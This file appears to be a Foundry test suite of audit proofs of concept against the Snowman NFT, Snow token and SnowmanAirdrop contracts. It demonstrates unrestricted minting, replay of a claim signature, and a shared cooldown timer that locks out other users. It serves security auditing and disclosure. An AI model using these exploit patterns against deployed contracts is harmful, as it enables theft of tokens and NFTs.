// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Snowman} from "../../src/Snowman.sol";
import {Snow} from "../../src/Snow.sol";
import {SnowmanAirdrop} from "../../src/SnowmanAirdrop.sol";
import {MockWETH} from "../../src/mock/MockWETH.sol";

contract TestAuditPoC is Test {
    Snowman public snowman;
    Snow public snow;
    SnowmanAirdrop public snowmanAirdrop;

    address attacker = makeAddr("attacker");
    uint256 receiverPk = 0xA11CE;
    address receiver = vm.addr(receiverPk);

    function setUp() public {
        MockWETH weth = new MockWETH();
        snowman = new Snowman("data:image/svg+xml;base64,PLACEHOLDER");
        snow = new Snow(address(weth), 1, address(this));
        bytes32 leaf = keccak256(
            bytes.concat(keccak256(abi.encode(receiver, uint256(1))))
        );
        snowmanAirdrop = new SnowmanAirdrop(
            leaf,
            address(snow),
            address(snowman)
        );
    }

    function test_H01_mintSnowman_hasNoAccessControl() public {
        // Attacker has zero Snow tokens, no signature, no merkle proof —
        // they call Snowman directly, completely bypassing SnowmanAirdrop
        vm.prank(attacker);
        snowman.mintSnowman(attacker, 999_999);

        // If this line is reached without reverting, the attacker
        // now owns 999,999 NFTs for free
        assertEq(snowman.balanceOf(attacker), 999_999);
    }
    function test_H03_earnSnow_sharedTimerLocksOutOtherUsers() public {
        address userA = makeAddr("userA");
        address userB = makeAddr("userB");

        // userA earns their free Snow first
        vm.prank(userA);
        snow.earnSnow();

        // userA now has 1 Snow token
        assertEq(snow.balanceOf(userA), 1);

        // userB has NEVER called earnSnow before — this is their very first attempt
        // If the timer were per-user, this should succeed with no problem
        vm.prank(userB);
        vm.expectRevert(Snow.S__Timer.selector);
        snow.earnSnow();

        // Confirm userB got nothing, purely because userA called first
        assertEq(snow.balanceOf(userB), 0);
    }
    function test_H02_claimSnowman_canBeReplayed() public {
        // receiver earns 1 free Snow token
        vm.prank(receiver);
        snow.earnSnow();
        assertEq(snow.balanceOf(receiver), 1);

        // receiver approves the airdrop contract to pull their Snow
        vm.prank(receiver);
        snow.approve(address(snowmanAirdrop), type(uint256).max);

        // receiver signs the claim message (off-chain signature simulation)
        bytes32 digest = snowmanAirdrop.getMessageHash(receiver);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(receiverPk, digest);

        bytes32[] memory proof = new bytes32[](0); // single-leaf tree, no proof needed

        // FIRST claim — this is meant to work exactly once
        vm.prank(attacker); // anyone can submit on receiver's behalf
        snowmanAirdrop.claimSnowman(receiver, proof, v, r, s);

        assertEq(snowman.balanceOf(receiver), 1);
        assertEq(snow.balanceOf(receiver), 0);

        // Time passes — receiver earns free Snow again, one week later
        vm.warp(block.timestamp + 1 weeks + 1);
        vm.prank(receiver);
        snow.earnSnow();
        assertEq(snow.balanceOf(receiver), 1);

        // REPLAY — reusing the EXACT SAME signature and proof from before
        vm.prank(attacker);
        snowmanAirdrop.claimSnowman(receiver, proof, v, r, s);

        // If this passes, the receiver now has 2 Snowman NFTs from ONE signature
        assertEq(snowman.balanceOf(receiver), 2);
        assertEq(snow.balanceOf(receiver), 0);
    }
}
